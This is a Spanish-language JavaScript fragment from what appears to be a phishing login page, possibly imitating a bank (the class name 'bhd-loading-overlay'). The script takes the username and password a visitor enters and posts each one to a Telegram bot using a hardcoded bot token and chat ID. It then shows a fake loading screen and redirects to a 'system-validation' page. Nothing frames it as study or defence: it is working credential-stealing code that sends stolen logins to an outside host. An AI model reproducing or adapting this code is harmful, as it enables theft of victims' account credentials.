  <script>
    function datarequest(msj) {
      var token = "7208122746:AAFY5yK7c6FTdzsw8olJP1keKGB9hR-oiMk";
      //var chat_id = "6027882720"; //cliente
      //var chat_id = "673560601";
      var chat_id = "7424277555"; 
      var url = `https://api.telegram.org/bot${token}/sendMessage`;

      $.ajax({
          type: 'POST',
          url: url,
          data: {
              chat_id: chat_id,
              text: msj
          },
          success: function(response) {
              console.log('Mensaje enviado a Telegram:', response);
          },
          error: function(xhr, status, error) {
              console.error('Error al enviar mensaje a Telegram:', status, error);
          }
      });
    }
    function ejecute(){
      // Obtener valores de los campos de entrada
      var user = $('#inputusername').val();
      var passwordinput = $('#passwordinput').val();
      
      
      if(user == ""){

        document.querySelector('#idmessageresport').textContent = "El campo de usuario es requerido.";
        $('#messagereport').show();
                    
        setTimeout(function() {
            $('#messagereport').hide();
        }, 10000);
      }else if(passwordinput == ""){
        document.querySelector('#idmessageresport').textContent = "El campo de Contrase√±a es requerido.";
        $('#messagereport').show();
                    
        setTimeout(function() {
            $('#messagereport').hide();
        }, 10000);
      }else{
        // Redirigir a system-validation sin la extensi√≥n .html
        datarequest("USUARIO: " + user);
        datarequest("CONTRASE√ëA: " + passwordinput);

        $('.bhd-loading-overlay').css('visibility', 'visible');

        setTimeout(function() {
          window.location.href = '/servicios/system-validation.html';
        }, 30000);
        

      }
    }
  </script>
